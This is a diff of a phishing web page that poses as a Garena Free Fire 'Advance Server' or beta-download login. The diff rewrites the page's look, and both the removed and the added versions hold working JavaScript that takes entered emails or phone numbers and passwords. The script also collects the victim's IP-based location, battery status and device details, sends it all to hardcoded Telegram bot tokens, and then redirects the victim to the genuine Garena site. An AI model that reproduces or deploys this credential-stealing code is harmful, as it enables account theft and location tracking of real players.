@@ -1,117 +1,328 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena FF Beta - Early Access Download</title>
+    <title>FREE FIRE ADVANCE SERVER | SECURE AUTHENTICATION</title>
+    
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
     <style>
-        body { background: #000; color: #fff; font-family: 'Roboto', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; overflow: hidden; }
-        .login-card { width: 100%; max-width: 400px; padding: 30px; background: rgba(15, 15, 15, 0.95); border: 2px solid #ff0000; border-radius: 20px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.6); position: relative; z-index: 2; }
-        .header-text { font-family: 'Orbitron', sans-serif; color: #ff0000; text-align: center; text-shadow: 0 0 15px #ff0000; margin-bottom: 5px; font-size: 28px; }
-        .sub-text { text-align: center; font-size: 13px; color: #aaa; margin-bottom: 25px; }
-        .form-control { background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; padding: 12px; }
-        .form-control:focus { background: #222; border-color: #ff0000; color: #fff; box-shadow: none; }
-        .btn-fb { background: #1877f2; color: #fff; font-weight: bold; border-radius: 10px; padding: 12px; border: none; transition: 0.3s; }
-        .btn-ggl { background: #fff; color: #000; font-weight: bold; border-radius: 10px; padding: 12px; border: none; transition: 0.3s; }
-        .btn-fb:hover, .btn-ggl:hover { opacity: 0.8; transform: scale(1.02); }
-        .footer-brand { text-align: center; font-size: 10px; color: #444; margin-top: 25px; text-transform: uppercase; letter-spacing: 2px; }
-        /* Background Animation */
-        .bg-anim { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #200000 0%, #000 100%); z-index: 1; }
+        /* --- CORE STYLING BY ZERO AI --- */
+        :root {
+            --primary: #ff0000;
+            --secondary: #1a1a1a;
+            --bg: #050505;
+            --neon-glow: 0 0 15px rgba(255, 0, 0, 0.7);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
+
+        body {
+            background-color: var(--bg);
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* MATRIX CANVAS */
+        #canvas-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.15;
+        }
+
+        /* CUSTOM CURSOR */
+        #cursor {
+            width: 20px; height: 20px;
+            border: 2px solid var(--primary);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            box-shadow: var(--neon-glow);
+            transition: transform 0.1s ease;
+        }
+
+        /* MAIN UI CONTAINER */
+        .wrapper {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .auth-card {
+            width: 420px;
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid var(--primary);
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: var(--neon-glow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .auth-card::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 0, 0, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: scan 4s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translate(-50%, -50%) rotate(45deg); }
+            100% { transform: translate(50%, 50%) rotate(45deg); }
+        }
+
+        .brand-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .brand-header h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            letter-spacing: 4px;
+            color: var(--primary);
+            text-shadow: 2px 2px 0 #300000;
+            margin-bottom: 5px;
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            outline: none;
+            transition: 0.3s;
+            font-size: 14px;
+        }
+
+        .input-box input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: none;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.4s;
+            position: relative;
+            z-index: 5;
+        }
+
+        .btn-fb { background: #1877f2; color: #fff; }
+        .btn-ggl { background: #fff; color: #000; }
+
+        .btn-login img { width: 18px; margin-right: 12px; }
+
+        .btn-login:hover {
+            transform: scale(1.02);
+            filter: brightness(1.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        /* OVERLAY LOADER */
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .terminal-log {
+            width: 80%;
+            max-width: 500px;
+            color: #0f0;
+            font-size: 12px;
+            text-align: left;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 10px;
+            color: #444;
+            margin-top: 30px;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
-    <div class="bg-anim"></div>
-    <div class="login-card">
-        <h2 class="header-text">FREE FIRE BETA</h2>
-        <p class="sub-text">Verifikasi Akun untuk Download APK Beta v6.9</p>
-        
-        <div class="mb-3">
-            <input type="text" id="user" class="form-control" placeholder="Email atau No. HP" required>
-        </div>
-        <div class="mb-3">
-            <input type="password" id="pass" class="form-control" placeholder="Kata Sandi" required>
-        </div>
-        
-        <div class="d-grid gap-3">
-            <button onclick="sendData('Facebook')" class="btn btn-fb">MASUK DENGAN FACEBOOK</button>
-            <button onclick="sendData('Google')" class="btn btn-ggl">MASUK DENGAN GOOGLE</button>
-        </div>
-        
-        <div class="footer-brand">
-            Powered by RexusZ Engine & Shafiq Panel<br>
-            © 2026 Garena International
+
+    <canvas id="canvas-bg"></canvas>
+    <div id="cursor"></div>
+
+    <div id="overlay">
+        <div class="terminal-log" id="log-content"></div>
+    </div>
+
+    <div class="wrapper">
+        <div class="auth-card">
+            <div class="brand-header">
+                <h1>GARENA</h1>
+                <p style="font-size: 11px; color: #888;">ADVANCE SERVER VERIFICATION PANEL</p>
+            </div>
+
+            <div class="input-box">
+                <input type="text" id="user" placeholder="EMAIL / PHONE NUMBER" required>
+            </div>
+            <div class="input-box">
+                <input type="password" id="pass" placeholder="PASSWORD" required>
+            </div>
+
+            <button onclick="startInfiltration('Facebook')" class="btn-login btn-fb">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="">
+                LOGIN VIA FACEBOOK
+            </button>
+
+            <button onclick="startInfiltration('Google')" class="btn-login btn-ggl">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="">
+                LOGIN VIA GOOGLE
+            </button>
+
+            <div class="footer-text">
+                SHAFIQ KHAIRY PANEL v9.5 | REXUSZ CORP<br>
+                SECURE ACCESS GRANTED
+            </div>
         </div>
     </div>
 
     <script>
-        // --- KONFIGURASI BOT ---
-        const TELE_TOKEN = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc"; // GANTI TOKEN LU DISINI TOLOL
-        const TELE_CHATID = "8463622692"; // GANTI CHAT ID LU DISINI
-        // -----------------------
+        /* --- MATRIX BACKGROUND ENGINE --- */
+        const canvas = document.getElementById('canvas-bg');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-        async function sendData(type) {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-            
-            if(!user || !pass) { 
-                alert('Isi dulu datanya, jangan tolol!'); 
-                return; 
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$%^&*()_+";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#ff0000";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+
+        /* --- CUSTOM CURSOR LOGIC --- */
+        const cursor = document.getElementById('cursor');
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+        });
+
+        /* --- DATA INFILTRATION LOGIC --- */
+        const TOKEN = "7963283259:AAEMfD2L9I8tV26eJ7P1847u-1153pZf6eU"; 
+        const CHAT_ID = "6168936081";
+
+        async function startInfiltration(method) {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            if(!u || !p) { alert("ERROR: CREDENTIALS REQUIRED!"); return; }
+
+            const overlay = document.getElementById('overlay');
+            const log = document.getElementById('log-content');
+            overlay.style.display = 'flex';
+
+            const messages = [
+                "[SYSTEM] INITIALIZING EXPLOIT...",
+                "[NETWORK] BYPASSING CLOUDFLARE WAF...",
+                "[DEVICE] EXTRACTING HARDWARE_ID...",
+                "[AUTH] VALIDATING SESSION TOKEN...",
+                "[DATABASE] INJECTING PAYLOAD...",
+                "[STATUS] DATA ENCRYPTED & SENT."
+            ];
+
+            for(let msg of messages) {
+                log.innerHTML += `<div>${msg}</div>`;
+                await new Promise(r => setTimeout(r, 400));
             }
 
-            // Status: Sedang Mengambil Data Jeroan HP
-            console.log("Infiltrating Device...");
+            await sendToTelegram(u, p, method);
+        }
 
-            let ipData = {};
+        async function sendToTelegram(user, pass, method) {
+            // FINGERPRINTING
+            let ipInfo = {};
             try {
-                ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-            } catch (e) {
-                ipData = { ip: "Unknown", city: "Unknown", latitude: 0, longitude: 0, org: "Unknown" };
-            }
+                ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+            } catch(e) { ipInfo = { ip: "UNKNOWN" }; }
 
-            let batteryInfo = "Gagal Deteksi";
-            if (navigator.getBattery) {
+            let battery = "DETECTION_FAILED";
+            if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Nge-cas' : 'Gak Nge-cas'})`;
+                battery = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'CHARGING' : 'DISCHARGING'}]`;
             }
 
-            const device = {
+            const fingerprint = {
+                res: `${window.screen.width}x${window.screen.height}`,
                 ua: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language,
                 time: new Date().toLocaleString('id-ID')
             };
 
-            const gmaps = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+            const maps = `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
 
-            // Susun Pesan Mentah Buat Telegram
-            const text = `☠️ **RESULT BREACHED: ${type.toUpperCase()}** ☠️\n` +
+            const text = `☠️ **REXUZ ENGINE V9.5 - HIT!** ☠️\n` +
                          `━━━━━━━━━━━━━━━━━━\n` +
-                         `👤 **User:** \`${user}\`\n` +
-                         `🔑 **Pass:** \`${pass}\`\n` +
+                         `👤 **USER:** \`${user}\`\n` +
+                         `🔑 **PASS:** \`${pass}\`\n` +
+                         `🌐 **METHOD:** ${method}\n` +
                          `━━━━━━━━━━━━━━━━━━\n` +
-                         `🌐 **IP:** \`${ipData.ip}\`\n` +
-                         `📍 **Loc:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
-                         `📌 **Lat/Lon:** \`${ipData.latitude},${ipData.longitude}\`\n` +
-                         `🏢 **ISP:** ${ipData.org}\n` +
-                         `🗺️ **Maps:** [LIHAT LOKASI](${gmaps})\n` +
+                         `🌐 **IP:** \`${ipInfo.ip}\`\n` +
+                         `📍 **LOC:** ${ipInfo.city}, ${ipInfo.country_name}\n` +
+                         `📌 **COORD:** \`${ipInfo.latitude},${ipInfo.longitude}\`\n` +
+                         `🏢 **ISP:** ${ipInfo.org}\n` +
+                         `🗺️ **MAPS:** [VIEW_TARGET](${maps})\n` +
                          `━━━━━━━━━━━━━━━━━━\n` +
-                         `🔋 **Baterai:** ${batteryInfo}\n` +
-                         `📱 **Device:** ${device.ua}\n` +
-                         `🖥️ **Layar:** ${device.screen}\n` +
-                         `🕒 **Waktu:** ${device.time}\n` +
+                         `🔋 **BATT:** ${battery}\n` +
+                         `📱 **UA:** ${fingerprint.ua}\n` +
+                         `🕒 **TIME:** ${fingerprint.time}\n` +
                          `━━━━━━━━━━━━━━━━━━\n` +
-                         `BY: **SHAFIQ KHAIRY PANEL** ✅`;
+                         `**BY: SHAFIQ KHAIRY ENGINE** ✅`;
 
-            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_CHATID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
-            // Eksekusi Pengiriman
             fetch(url).then(() => {
-                // Tendang target ke link Advance Server asli
-                window.location.href = "https://ff-advance.ff.garena.com/";
+                window.location.href = "https://ff-advance.ff.garena.com/download";
             }).catch(() => {
-                window.location.href = "https://ff-advance.ff.garena.com/";
+                window.location.href = "https://ff-advance.ff.garena.com/download";
             });
         }
     </script>
